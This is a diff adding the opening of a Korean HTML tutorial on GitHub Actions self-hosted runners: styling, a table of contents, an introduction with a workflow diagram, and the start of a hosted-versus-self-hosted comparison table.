@@ -1,0 +1,2457 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GitHub Actions Self-Hosted Runner 완전 가이드 — 신입 DevOps 엔지니어용</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://cdn.jsdelivr.net">
+<link href="https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/variable/pretendardvariable-dynamic-subset.css" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --ink:#080B10;
+  --ink-2:#0D1219;
+  --panel:#121A24;
+  --panel-2:#18222E;
+  --line:#22303F;
+  --line-soft:#1A2530;
+  --text:#DCE4EE;
+  --text-2:#A5B3C4;
+  --muted:#6E7F93;
+  --cloud:#7C93F5;      /* GitHub 클라우드 측 */
+  --runner:#34D3A6;     /* 셀프 호스티드 러너 측 */
+  --queue:#F5A524;      /* 대기 중인 잡 */
+  --danger:#F2617A;     /* 오류 / 경고 */
+  --violet:#B08CF5;
+  --mono:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
+  --sans:'Pretendard Variable',Pretendard,-apple-system,BlinkMacSystemFont,system-ui,sans-serif;
+  --sidebar-w:288px;
+  --radius:10px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:80px}
+@media (prefers-reduced-motion: reduce){
+  html{scroll-behavior:auto}
+  *,*::before,*::after{animation-duration:.001ms !important;animation-iteration-count:1 !important;transition-duration:.001ms !important}
+}
+body{
+  margin:0;background:var(--ink);color:var(--text);
+  font-family:var(--sans);font-size:16.5px;line-height:1.78;
+  -webkit-font-smoothing:antialiased;
+  background-image:radial-gradient(900px 500px at 82% -8%, rgba(124,147,245,.10), transparent 60%),
+                   radial-gradient(700px 420px at 4% 12%, rgba(52,211,166,.07), transparent 62%);
+  background-attachment:fixed;
+}
+::selection{background:rgba(52,211,166,.28)}
+
+/* ---------- 상단 진행 바 ---------- */
+#progress{position:fixed;top:0;left:0;height:2px;width:0%;z-index:120;
+  background:linear-gradient(90deg,var(--runner),var(--cloud));box-shadow:0 0 12px rgba(52,211,166,.5)}
+
+/* ---------- 레이아웃 ---------- */
+.layout{display:flex;min-height:100vh}
+aside.nav{
+  width:var(--sidebar-w);flex:0 0 var(--sidebar-w);position:sticky;top:0;height:100vh;
+  overflow-y:auto;border-right:1px solid var(--line-soft);
+  background:linear-gradient(180deg,rgba(13,18,25,.96),rgba(8,11,16,.96));
+  backdrop-filter:blur(8px);padding:26px 18px 60px;
+}
+aside.nav::-webkit-scrollbar{width:6px}
+aside.nav::-webkit-scrollbar-thumb{background:var(--line);border-radius:3px}
+.brand{display:flex;gap:11px;align-items:center;margin-bottom:4px}
+.brand-mark{width:32px;height:32px;flex:0 0 32px;border-radius:9px;
+  background:linear-gradient(140deg,var(--runner),#1E9E7C);display:grid;place-items:center;
+  font-family:var(--mono);font-weight:700;font-size:14px;color:#04120D}
+.brand-t{font-weight:800;font-size:14.5px;letter-spacing:-.01em;line-height:1.25}
+.brand-s{font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:.09em;text-transform:uppercase}
+.nav-hint{font-family:var(--mono);font-size:10px;color:var(--muted);letter-spacing:.1em;
+  text-transform:uppercase;margin:24px 0 10px;padding-left:2px}
+.nav a{display:flex;gap:10px;align-items:baseline;text-decoration:none;color:var(--text-2);
+  font-size:13.6px;padding:7px 10px;border-radius:7px;border-left:2px solid transparent;transition:.16s}
+.nav a .n{font-family:var(--mono);font-size:10.5px;color:var(--muted);flex:0 0 24px}
+.nav a:hover{background:var(--panel);color:var(--text)}
+.nav a.active{background:linear-gradient(90deg,rgba(52,211,166,.14),transparent);
+  border-left-color:var(--runner);color:#fff;font-weight:600}
+.nav a.active .n{color:var(--runner)}
+
+main{flex:1;min-width:0;max-width:1000px;margin:0 auto;padding:0 46px 140px}
+
+/* ---------- 히어로 ---------- */
+.hero{padding:86px 0 44px;border-bottom:1px solid var(--line-soft);margin-bottom:52px}
+.eyebrow{font-family:var(--mono);font-size:11px;letter-spacing:.18em;text-transform:uppercase;
+  color:var(--runner);display:flex;align-items:center;gap:10px;margin-bottom:20px}
+.eyebrow::after{content:"";height:1px;flex:1;background:linear-gradient(90deg,var(--line),transparent)}
+h1{font-size:clamp(32px,5vw,52px);line-height:1.13;letter-spacing:-.035em;font-weight:800;margin:0 0 20px}
+h1 .hl{background:linear-gradient(180deg,transparent 62%,rgba(52,211,166,.28) 62%)}
+.lede{font-size:18px;color:var(--text-2);max-width:66ch;margin:0 0 26px}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px}
+.chip{font-family:var(--mono);font-size:11px;padding:5px 11px;border:1px solid var(--line);
+  border-radius:999px;color:var(--text-2);background:var(--ink-2)}
+.chip b{color:var(--runner);font-weight:500}
+
+/* ---------- 섹션 ---------- */
+section{scroll-margin-top:24px;padding:14px 0 30px}
+.sec-head{display:flex;gap:16px;align-items:flex-start;margin:56px 0 20px;
+  padding-top:34px;border-top:1px solid var(--line-soft)}
+section:first-of-type .sec-head{border-top:none;padding-top:0;margin-top:0}
+.sec-num{font-family:var(--mono);font-size:12px;color:var(--runner);padding-top:14px;flex:0 0 34px;letter-spacing:.04em}
+h2{font-size:clamp(24px,3.4vw,32px);line-height:1.22;letter-spacing:-.028em;font-weight:800;margin:0}
+.sec-sub{color:var(--muted);font-size:14.5px;margin-top:7px}
+h3{font-size:19.5px;letter-spacing:-.02em;font-weight:700;margin:38px 0 12px;
+  display:flex;align-items:center;gap:9px}
+h3::before{content:"";width:3px;height:17px;background:var(--runner);border-radius:2px;flex:0 0 3px}
+h4{font-size:16px;font-weight:700;margin:26px 0 8px;color:var(--text)}
+p{margin:0 0 15px}
+a.link{color:var(--cloud);text-decoration:none;border-bottom:1px solid rgba(124,147,245,.34)}
+a.link:hover{border-bottom-color:var(--cloud)}
+ul,ol{margin:0 0 16px;padding-left:22px}
+li{margin-bottom:7px}
+li::marker{color:var(--muted)}
+strong{color:#fff;font-weight:700}
+code:not(pre code){font-family:var(--mono);font-size:.855em;background:var(--panel-2);
+  border:1px solid var(--line-soft);padding:1.5px 6px;border-radius:5px;color:#9FE9CF;white-space:nowrap}
+.kw-cloud{color:var(--cloud)}
+.kw-run{color:var(--runner)}
+.kw-warn{color:var(--queue)}
+
+/* ---------- 카드 / 콜아웃 ---------- */
+.card{background:var(--ink-2);border:1px solid var(--line-soft);border-radius:var(--radius);
+  padding:20px 22px;margin:20px 0}
+.card-t{font-weight:700;font-size:15px;margin-bottom:8px;display:flex;align-items:center;gap:8px}
+.grid{display:grid;gap:14px;margin:20px 0}
+.g2{grid-template-columns:repeat(2,minmax(0,1fr))}
+.g3{grid-template-columns:repeat(3,minmax(0,1fr))}
+.g4{grid-template-columns:repeat(4,minmax(0,1fr))}
+@media(max-width:820px){.g2,.g3,.g4{grid-template-columns:1fr}}
+
+.note{border-left:3px solid var(--cloud);background:linear-gradient(90deg,rgba(124,147,245,.08),transparent 70%);
+  padding:15px 18px;border-radius:0 var(--radius) var(--radius) 0;margin:20px 0;font-size:15.4px}
+.warn{border-left:3px solid var(--queue);background:linear-gradient(90deg,rgba(245,165,36,.09),transparent 70%);
+  padding:15px 18px;border-radius:0 var(--radius) var(--radius) 0;margin:20px 0;font-size:15.4px}
+.danger{border-left:3px solid var(--danger);background:linear-gradient(90deg,rgba(242,97,122,.10),transparent 70%);
+  padding:15px 18px;border-radius:0 var(--radius) var(--radius) 0;margin:20px 0;font-size:15.4px}
+.tip{border-left:3px solid var(--runner);background:linear-gradient(90deg,rgba(52,211,166,.09),transparent 70%);
+  padding:15px 18px;border-radius:0 var(--radius) var(--radius) 0;margin:20px 0;font-size:15.4px}
+.cal-t{font-family:var(--mono);font-size:11px;letter-spacing:.12em;text-transform:uppercase;
+  display:block;margin-bottom:6px;font-weight:700}
+.note .cal-t{color:var(--cloud)} .warn .cal-t{color:var(--queue)}
+.danger .cal-t{color:var(--danger)} .tip .cal-t{color:var(--runner)}
+
+/* ---------- 코드 블록 ---------- */
+.code{margin:18px 0;border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;background:#080C11}
+.code-bar{display:flex;align-items:center;gap:4px;background:var(--panel);
+  border-bottom:1px solid var(--line);padding:0 8px 0 0;min-height:38px;flex-wrap:wrap}
+.tabs{display:flex;gap:2px;flex:1;min-width:0;overflow-x:auto}
+.tab{font-family:var(--mono);font-size:11.5px;color:var(--muted);background:none;border:none;
+  padding:11px 14px;cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;transition:.15s}
+.tab:hover{color:var(--text-2)}
+.tab.active{color:var(--runner);border-bottom-color:var(--runner);background:rgba(52,211,166,.06)}
+.copy{font-family:var(--mono);font-size:10.5px;color:var(--muted);background:var(--panel-2);
+  border:1px solid var(--line);border-radius:6px;padding:4px 9px;cursor:pointer;margin:0 4px;transition:.15s}
+.copy:hover{color:var(--runner);border-color:var(--runner)}
+.copy.done{color:var(--runner);border-color:var(--runner)}
+pre{margin:0;padding:16px 18px;overflow-x:auto;font-family:var(--mono);font-size:13px;line-height:1.72}
+pre::-webkit-scrollbar{height:7px} pre::-webkit-scrollbar-thumb{background:var(--line);border-radius:4px}
+.pane{display:none} .pane.active{display:block}
+.c-cm{color:#546479}   /* 주석 */
+.c-st{color:#9FE9CF}   /* 문자열 */
+.c-kw{color:var(--violet)} /* 키워드 */
+.c-fn{color:var(--cloud)}
+.c-nu{color:var(--queue)}
+.c-yk{color:#7EC8FF}   /* yaml key */
+.c-pr{color:var(--runner);user-select:none} /* 프롬프트 */
+.c-out{color:#7D8CA1}
+.c-hi{background:rgba(245,165,36,.12);display:inline-block;width:100%}
+
+/* ---------- 표 ---------- */
+.tw{overflow-x:auto;margin:20px 0;border:1px solid var(--line-soft);border-radius:var(--radius)}
+table{width:100%;border-collapse:collapse;font-size:14.4px;min-width:520px}
+th{background:var(--panel);text-align:left;padding:12px 14px;font-weight:700;font-size:12px;
+  font-family:var(--mono);letter-spacing:.07em;text-transform:uppercase;color:var(--text-2);
+  border-bottom:1px solid var(--line)}
+td{padding:12px 14px;border-bottom:1px solid var(--line-soft);vertical-align:top;color:var(--text-2)}
+tr:last-child td{border-bottom:none}
+tbody tr:hover td{background:rgba(24,34,46,.5)}
+td strong{color:#fff}
+
+/* ---------- 인터랙티브 공통 ---------- */
+.demo{background:linear-gradient(160deg,var(--panel),var(--ink-2));border:1px solid var(--line);
+  border-radius:14px;padding:22px;margin:26px 0}
+.demo-h{display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;
+  margin-bottom:16px;padding-bottom:13px;border-bottom:1px dashed var(--line)}
+.demo-t{font-weight:700;font-size:15px;display:flex;align-items:center;gap:9px}
+.demo-tag{font-family:var(--mono);font-size:10px;letter-spacing:.13em;text-transform:uppercase;
+  color:var(--queue);border:1px solid rgba(245,165,36,.35);padding:3px 9px;border-radius:999px}
+.btn{font-family:var(--mono);font-size:12px;padding:8px 15px;border-radius:8px;cursor:pointer;
+  border:1px solid var(--line);background:var(--panel-2);color:var(--text);transition:.16s}
+.btn:hover{border-color:var(--runner);color:var(--runner)}
+.btn.primary{background:linear-gradient(140deg,var(--runner),#1E9E7C);color:#04120D;border-color:transparent;font-weight:700}
+.btn.primary:hover{filter:brightness(1.1);color:#04120D}
+.btn:disabled{opacity:.4;cursor:not-allowed}
+.btn-row{display:flex;gap:8px;flex-wrap:wrap}
+input[type=text],select,textarea{font-family:var(--mono);font-size:12.5px;background:var(--ink);
+  border:1px solid var(--line);color:var(--text);padding:8px 11px;border-radius:7px;width:100%}
+input[type=text]:focus,select:focus,textarea:focus{outline:2px solid rgba(52,211,166,.5);outline-offset:1px;border-color:var(--runner)}
+label.fld{display:block;font-family:var(--mono);font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;
+  color:var(--muted);margin-bottom:6px}
+.fld-wrap{margin-bottom:13px}
+:focus-visible{outline:2px solid var(--runner);outline-offset:2px}
+
+/* ---------- 러너 시뮬레이터 ---------- */
+.sim{display:grid;grid-template-columns:1fr 42px 1fr;gap:0;align-items:stretch}
+@media(max-width:760px){.sim{grid-template-columns:1fr;gap:14px}}
+.sim-col{background:var(--ink);border:1px solid var(--line-soft);border-radius:12px;padding:14px}
+.sim-col-t{font-family:var(--mono);font-size:10px;letter-spacing:.12em;text-transform:uppercase;
+  color:var(--muted);margin-bottom:11px;display:flex;justify-content:space-between}
+.sim-wall{display:grid;place-items:center;position:relative}
+.sim-wall::before{content:"";position:absolute;top:6px;bottom:6px;width:2px;
+  background:repeating-linear-gradient(180deg,var(--line) 0 6px,transparent 6px 12px)}
+.wall-lbl{font-family:var(--mono);font-size:9px;color:var(--muted);writing-mode:vertical-rl;
+  background:var(--ink);padding:8px 3px;z-index:1;letter-spacing:.14em}
+@media(max-width:760px){.sim-wall{display:none}}
+.job{font-family:var(--mono);font-size:11px;padding:8px 10px;border-radius:7px;margin-bottom:7px;
+  border:1px solid var(--line);background:var(--panel-2);display:flex;justify-content:space-between;
+  gap:8px;align-items:center;transition:.3s}
+.job .lbls{color:var(--queue);font-size:10px}
+.job.queued{border-color:rgba(245,165,36,.4);background:rgba(245,165,36,.07)}
+.job.running{border-color:rgba(52,211,166,.45);background:rgba(52,211,166,.09)}
+.job.done{opacity:.42;border-style:dashed}
+.job.stuck{border-color:rgba(242,97,122,.5);background:rgba(242,97,122,.08)}
+.rnr{border:1px solid var(--line);border-radius:9px;padding:11px;margin-bottom:9px;background:var(--panel-2);transition:.3s}
+.rnr.busy{border-color:rgba(52,211,166,.5);box-shadow:0 0 0 1px rgba(52,211,166,.2) inset}
+.rnr.off{opacity:.45}
+.rnr-top{display:flex;justify-content:space-between;align-items:center;gap:8px;font-family:var(--mono);font-size:11.5px}
+.dot{width:7px;height:7px;border-radius:50%;flex:0 0 7px;display:inline-block}
+.dot.idle{background:var(--muted)} .dot.busy{background:var(--runner);box-shadow:0 0 8px var(--runner)}
+.dot.off{background:var(--danger)}
+.rnr-lbls{margin-top:7px;display:flex;gap:4px;flex-wrap:wrap}
+.tagl{font-family:var(--mono);font-size:9.5px;padding:2px 7px;border-radius:999px;
+  border:1px solid var(--line);color:var(--text-2);background:var(--ink)}
+.tagl.match{border-color:var(--runner);color:var(--runner);background:rgba(52,211,166,.1)}
+.poll{font-family:var(--mono);font-size:9.5px;color:var(--cloud);opacity:0;transition:.2s}
+.poll.on{opacity:1}
+.sim-log{font-family:var(--mono);font-size:11px;background:#060A0E;border:1px solid var(--line-soft);
+  border-radius:9px;padding:11px 13px;margin-top:14px;max-height:160px;overflow-y:auto;line-height:1.75}
+.sim-log div{color:var(--text-2)}
+.sim-log .t{color:var(--muted)}
+.sim-log .ok{color:var(--runner)} .sim-log .q{color:var(--queue)} .sim-log .er{color:var(--danger)}
+.sim-log .cl{color:var(--cloud)}
+
+/* ---------- 퀴즈 ---------- */
+.quiz{background:var(--ink-2);border:1px solid var(--line-soft);border-radius:12px;padding:20px;margin:16px 0}
+.q-n{font-family:var(--mono);font-size:10.5px;color:var(--runner);letter-spacing:.1em;margin-bottom:8px}
+.q-t{font-weight:700;font-size:15.5px;margin-bottom:14px;line-height:1.55}
+.opt{display:block;width:100%;text-align:left;background:var(--panel-2);border:1px solid var(--line);
+  color:var(--text-2);padding:11px 14px;border-radius:8px;margin-bottom:8px;cursor:pointer;
+  font-size:14.3px;transition:.15s;font-family:var(--sans)}
+.opt:hover:not(:disabled){border-color:var(--muted);color:var(--text)}
+.opt.right{border-color:var(--runner);background:rgba(52,211,166,.11);color:#fff}
+.opt.wrong{border-color:var(--danger);background:rgba(242,97,122,.1);color:#fff}
+.opt:disabled{cursor:default}
+.q-exp{display:none;margin-top:12px;padding:13px 15px;background:var(--panel);border-radius:8px;
+  font-size:14.3px;border-left:3px solid var(--runner);color:var(--text-2)}
+.q-exp.show{display:block}
+.score{font-family:var(--mono);font-size:12.5px;color:var(--text-2);text-align:center;
+  padding:14px;border:1px dashed var(--line);border-radius:9px;margin-top:16px}
+.score b{color:var(--runner);font-size:16px}
+
+/* ---------- 체크리스트 ---------- */
+.ck{display:flex;gap:11px;align-items:flex-start;padding:11px 13px;border:1px solid var(--line-soft);
+  border-radius:9px;margin-bottom:8px;background:var(--ink-2);cursor:pointer;transition:.15s}
+.ck:hover{border-color:var(--line)}
+.ck.on{border-color:rgba(52,211,166,.4);background:rgba(52,211,166,.06)}
+.ck-box{width:17px;height:17px;flex:0 0 17px;border:1.5px solid var(--muted);border-radius:5px;
+  margin-top:4px;display:grid;place-items:center;font-size:11px;color:transparent;transition:.15s}
+.ck.on .ck-box{border-color:var(--runner);background:var(--runner);color:#04120D}
+.ck-t{font-size:14.6px}
+.ck-t small{display:block;color:var(--muted);font-size:12.6px;margin-top:2px;font-family:var(--mono)}
+.ck.on .ck-t{color:#fff}
+.ck-bar{height:5px;background:var(--panel-2);border-radius:3px;overflow:hidden;margin:6px 0 18px}
+.ck-bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--runner),var(--cloud));transition:.35s}
+
+/* ---------- 아코디언 (트러블슈팅) ---------- */
+.acc{border:1px solid var(--line-soft);border-radius:10px;margin-bottom:10px;overflow:hidden;background:var(--ink-2)}
+.acc-h{display:flex;gap:12px;align-items:center;padding:14px 16px;cursor:pointer;transition:.15s;width:100%;
+  background:none;border:none;color:var(--text);text-align:left;font-family:var(--sans);font-size:15px}
+.acc-h:hover{background:var(--panel)}
+.acc-code{font-family:var(--mono);font-size:10px;color:var(--danger);border:1px solid rgba(242,97,122,.35);
+  padding:3px 8px;border-radius:5px;flex:0 0 auto;letter-spacing:.05em}
+.acc-t{flex:1;font-weight:600;min-width:0}
+.acc-x{color:var(--muted);font-family:var(--mono);font-size:15px;transition:.2s;flex:0 0 auto}
+.acc.open .acc-x{transform:rotate(45deg);color:var(--runner)}
+.acc-b{display:none;padding:2px 18px 18px;border-top:1px solid var(--line-soft)}
+.acc.open .acc-b{display:block}
+.acc-b .sym{font-family:var(--mono);font-size:12px;color:var(--danger);background:rgba(242,97,122,.07);
+  border:1px solid rgba(242,97,122,.2);padding:9px 12px;border-radius:7px;margin:14px 0;
+  white-space:pre-wrap;word-break:break-all}
+
+/* ---------- SVG 도해 ---------- */
+figure{margin:26px 0;padding:20px;background:var(--ink-2);border:1px solid var(--line-soft);border-radius:12px}
+figure svg{width:100%;height:auto;display:block}
+figcaption{font-family:var(--mono);font-size:11px;color:var(--muted);margin-top:14px;
+  padding-top:11px;border-top:1px dashed var(--line);letter-spacing:.02em}
+.svg-l{font-family:'JetBrains Mono',monospace;font-size:11px;fill:var(--text-2)}
+.svg-t{font-family:'JetBrains Mono',monospace;font-size:12.5px;fill:#fff;font-weight:700}
+.svg-s{font-family:'JetBrains Mono',monospace;font-size:9.5px;fill:var(--muted)}
+.flowline{stroke-dasharray:5 5;animation:dash 1.2s linear infinite}
+@keyframes dash{to{stroke-dashoffset:-20}}
+.pulse{animation:pulse 2.4s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:.35}50%{opacity:1}}
+
+/* ---------- 기타 ---------- */
+.kbd{font-family:var(--mono);font-size:11px;border:1px solid var(--line);border-bottom-width:2px;
+  padding:2px 6px;border-radius:5px;background:var(--panel-2);color:var(--text-2)}
+footer{border-top:1px solid var(--line-soft);margin-top:70px;padding-top:28px;
+  color:var(--muted);font-size:13.4px}
+.toplink{position:fixed;right:22px;bottom:22px;width:42px;height:42px;border-radius:11px;
+  background:var(--panel);border:1px solid var(--line);display:grid;place-items:center;
+  color:var(--text-2);text-decoration:none;opacity:0;pointer-events:none;transition:.25s;z-index:100}
+.toplink.on{opacity:1;pointer-events:auto}
+.toplink:hover{border-color:var(--runner);color:var(--runner)}
+.mobile-bar{display:none}
+@media(max-width:980px){
+  aside.nav{position:fixed;left:0;top:0;z-index:110;transform:translateX(-100%);transition:.25s;box-shadow:0 0 40px rgba(0,0,0,.6)}
+  aside.nav.open{transform:none}
+  main{padding:0 20px 120px}
+  .mobile-bar{display:flex;position:sticky;top:0;z-index:90;gap:12px;align-items:center;
+    background:rgba(8,11,16,.94);backdrop-filter:blur(10px);border-bottom:1px solid var(--line-soft);
+    padding:11px 16px;margin:0 -20px 0}
+  .hero{padding-top:40px}
+}
+</style>
+</head>
+<body>
+<div id="progress"></div>
+<div class="layout">
+<aside class="nav" id="nav">
+  <div class="brand">
+    <div class="brand-mark">SH</div>
+    <div>
+      <div class="brand-t">Self-Hosted Runner<br>완전 가이드</div>
+      <div class="brand-s">GitHub Actions / Lv.1</div>
+    </div>
+  </div>
+  <div class="nav-hint">개념 이해</div>
+  <a href="#s1"><span class="n">01</span><span>러너(Runner)가 뭔가요?</span></a>
+  <a href="#s2"><span class="n">02</span><span>GitHub-hosted vs Self-hosted</span></a>
+  <a href="#s3"><span class="n">03</span><span>동작 원리: 왜 방화벽을 안 열까</span></a>
+  <div class="nav-hint">설치와 등록</div>
+  <a href="#s4"><span class="n">04</span><span>설치 전 준비물 점검</span></a>
+  <a href="#s5"><span class="n">05</span><span>등록 범위: Repo / Org / Ent</span></a>
+  <a href="#s6"><span class="n">06</span><span>설치 실습 (OS별)</span></a>
+  <a href="#s7"><span class="n">07</span><span>서비스로 상시 운영</span></a>
+  <div class="nav-hint">사용과 운영</div>
+  <a href="#s8"><span class="n">08</span><span>워크플로우 연결과 라벨</span></a>
+  <a href="#s9"><span class="n">09</span><span>보안: 절대 지킬 것들</span></a>
+  <a href="#s10"><span class="n">10</span><span>컨테이너 · K8s(ARC) 러너</span></a>
+  <a href="#s11"><span class="n">11</span><span>운영·유지보수 실무</span></a>
+  <div class="nav-hint">문제 해결</div>
+  <a href="#s12"><span class="n">12</span><span>트러블슈팅 14선</span></a>
+  <a href="#s13"><span class="n">13</span><span>증상별 진단 도우미</span></a>
+  <div class="nav-hint">마무리</div>
+  <a href="#s14"><span class="n">14</span><span>구축 체크리스트</span></a>
+  <a href="#s15"><span class="n">15</span><span>이해도 퀴즈 10문항</span></a>
+  <a href="#s16"><span class="n">16</span><span>치트시트 &amp; 참고자료</span></a>
+</aside>
+
+<main>
+<div class="mobile-bar">
+  <button class="btn" onclick="document.getElementById('nav').classList.toggle('open')">☰ 목차</button>
+  <span style="font-family:var(--mono);font-size:11px;color:var(--muted)">Self-Hosted Runner 가이드</span>
+</div>
+
+<header class="hero">
+  <div class="eyebrow">DevOps 온보딩 · 실습형 강의</div>
+  <h1>내 서버를 GitHub Actions의<br><span class="hl">일꾼(Runner)</span>으로 만드는 법</h1>
+  <p class="lede">
+    GitHub Actions는 편하지만, 사내망 DB에 접근해야 하거나 GPU가 필요하거나 빌드 시간을 줄이고 싶을 때가 옵니다.
+    그때 필요한 게 <strong>Self-Hosted Runner</strong>입니다. 이 문서는 러너를 한 번도 만져본 적 없는 신입 엔지니어가
+    개념 → 설치 → 운영 → 장애 대응까지 혼자 완주할 수 있도록 만든 실습 가이드입니다.
+  </p>
+  <div class="meta-row">
+    <span class="chip">읽는 시간 <b>약 45분</b></span>
+    <span class="chip">실습 <b>60분</b></span>
+    <span class="chip">대상 <b>신입 DevOps</b></span>
+    <span class="chip">인터랙티브 <b>시뮬레이터 · 진단기 · 퀴즈</b></span>
+    <span class="chip">기준 <b>Runner v2.32x / 2026</b></span>
+  </div>
+</header>
+
+<!-- ============ 01 ============ -->
+<section id="s1">
+  <div class="sec-head"><div class="sec-num">01</div>
+    <div><h2>러너(Runner)가 뭔가요?</h2>
+    <div class="sec-sub">CI/CD를 '주문서'와 '주방'으로 이해하기</div></div>
+  </div>
+
+  <p>
+    GitHub Actions를 처음 배울 때 가장 헷갈리는 지점은 <strong>"YAML을 쓰면 누가 실행하는가"</strong>입니다.
+    비유로 정리하면 아주 간단합니다.
+  </p>
+
+  <div class="grid g3">
+    <div class="card"><div class="card-t">📝 워크플로우 YAML</div>
+      <p style="margin:0;font-size:14.6px;color:var(--text-2)">주문서. "빌드하고 테스트하고 배포해줘"라고 <b>적어둔 종이</b>일 뿐, 스스로 아무것도 하지 않습니다.</p></div>
+    <div class="card"><div class="card-t">☁️ GitHub (컨트롤 플레인)</div>
+      <p style="margin:0;font-size:14.6px;color:var(--text-2)">주문 접수 카운터. 이벤트(push, PR)를 감지해 잡(Job)을 <b>큐에 넣고</b> 결과를 모아 보여줍니다.</p></div>
+    <div class="card"><div class="card-t">🏃 러너 (Runner)</div>
+      <p style="margin:0;font-size:14.6px;color:var(--text-2)">주방. 실제로 <code>npm ci</code>, <code>docker build</code>를 <b>실행하는 컴퓨터</b>입니다. 여기가 러너입니다.</p></div>
+  </div>
+
+  <p>
+    즉 러너는 <strong>GitHub이 내려주는 명령을 대신 실행해주는 에이전트 프로그램이 설치된 머신</strong>입니다.
+    이 머신을 GitHub이 빌려주면 <span class="kw-cloud">GitHub-hosted runner</span>,
+    내가 준비하면 <span class="kw-run">Self-hosted runner</span>라고 부릅니다.
+  </p>
+
+  <figure>
+  <svg viewBox="0 0 860 260" role="img" aria-label="워크플로우가 실행되는 전체 흐름 도해">
+    <defs>
+      <marker id="ar" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto">
+        <path d="M0,0 L7,3 L0,6 z" fill="#7C93F5"/></marker>
+      <marker id="ar2" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto">
+        <path d="M0,0 L7,3 L0,6 z" fill="#34D3A6"/></marker>
+    </defs>
+    <!-- 1 개발자 -->
+    <rect x="10" y="80" width="140" height="92" rx="10" fill="#121A24" stroke="#22303F"/>
+    <text x="80" y="112" class="svg-t" text-anchor="middle">개발자</text>
+    <text x="80" y="134" class="svg-l" text-anchor="middle">git push</text>
+    <text x="80" y="152" class="svg-s" text-anchor="middle">feature/login</text>
+    <!-- 2 GitHub -->
+    <rect x="200" y="40" width="200" height="172" rx="10" fill="#101825" stroke="#7C93F5" stroke-opacity=".45"/>
+    <text x="300" y="68" class="svg-t" text-anchor="middle" fill="#7C93F5">GitHub</text>
+    <text x="300" y="86" class="svg-s" text-anchor="middle">컨트롤 플레인</text>
+    <rect x="218" y="100" width="164" height="34" rx="7" fill="#0B111A" stroke="#22303F"/>
+    <text x="300" y="122" class="svg-l" text-anchor="middle">① 이벤트 감지</text>
+    <rect x="218" y="144" width="164" height="34" rx="7" fill="#0B111A" stroke="#F5A524" stroke-opacity=".5"/>
+    <text x="300" y="166" class="svg-l" text-anchor="middle" fill="#F5A524">② 잡(Job) 큐 적재</text>
+    <!-- 3 runner -->
+    <rect x="450" y="40" width="200" height="172" rx="10" fill="#101B1B" stroke="#34D3A6" stroke-opacity=".45"/>
+    <text x="550" y="68" class="svg-t" text-anchor="middle" fill="#34D3A6">Runner</text>
+    <text x="550" y="86" class="svg-s" text-anchor="middle">실행 주체 (내 서버)</text>
+    <rect x="468" y="100" width="164" height="34" rx="7" fill="#0B111A" stroke="#22303F"/>
+    <text x="550" y="122" class="svg-l" text-anchor="middle">③ 잡 수신 &amp; 실행</text>
+    <rect x="468" y="144" width="164" height="34" rx="7" fill="#0B111A" stroke="#22303F"/>
+    <text x="550" y="166" class="svg-l" text-anchor="middle">④ 로그 스트리밍</text>
+    <!-- 4 결과 -->
+    <rect x="700" y="80" width="150" height="92" rx="10" fill="#121A24" stroke="#22303F"/>
+    <text x="775" y="112" class="svg-t" text-anchor="middle">Actions 화면</text>
+    <text x="775" y="134" class="svg-l" text-anchor="middle">✓ 초록 체크</text>
+    <text x="775" y="152" class="svg-s" text-anchor="middle">로그 / 아티팩트</text>
+    <!-- arrows -->
+    <line x1="152" y1="126" x2="196" y2="126" stroke="#7C93F5" stroke-width="1.6" marker-end="url(#ar)"/>
+    <line x1="402" y1="126" x2="446" y2="126" stroke="#34D3A6" stroke-width="1.6" marker-end="url(#ar2)" class="flowline"/>
+    <line x1="652" y1="126" x2="696" y2="126" stroke="#7C93F5" stroke-width="1.6" marker-end="url(#ar)"/>
+    <text x="424" y="112" class="svg-s" text-anchor="middle" fill="#34D3A6">polling</text>
+  </svg>
+  <figcaption>흐름 요약 — push(개발자) → 잡 생성(GitHub) → 잡 실행(러너) → 결과 표시(GitHub). 러너가 없으면 워크플로우는 영원히 "Queued" 상태로 멈춥니다.</figcaption>
+  </figure>
+
+  <div class="note"><span class="cal-t">용어 정리</span>
+    <b>Workflow</b> = 파이프라인 전체(<code>.github/workflows/*.yml</code>) · <b>Job</b> = 한 머신에서 실행되는 작업 묶음 ·
+    <b>Step</b> = 잡 안의 명령 한 줄 · <b>Runner</b> = 잡 하나를 맡아 처리하는 실행기.
+    러너 1대는 기본적으로 <b>동시에 잡 1개</b>만 처리합니다(이게 나중에 큐 적체의 원인이 됩니다).
+  </div>
+</section>
+
+<!-- ============ 02 ============ -->
+<section id="s2">
+  <div class="sec-head"><div class="sec-num">02</div>
+    <div><h2>GitHub-hosted vs Self-hosted</h2>
+    <div class="sec-sub">언제 직접 구축해야 하는지 판단 기준 잡기</div></div>
+  </div>
+
+  <div class="tw"><table>
+    <thead><tr><th style="width:20%">비교 항목</th><th style="width:40%">GitHub-hosted</th><th style="width:40%">Self-hosted</th></tr></thead>
+    <tbody>
+      <tr><td><strong>준비 작업</strong></td><td><code>runs-on: ubuntu-latest</code> 한 줄. 끝.</td><td>서버 준비 + 에이전트 설치 + 운영 책임</td></tr>
+      <tr><td><strong>환경 초기화</strong></td><td>매 잡마다 <b>깨끗한 새 VM</b></td><td>기본은 <b>재사용</b>(이전 잡의 흔적이 남음)</td></tr>
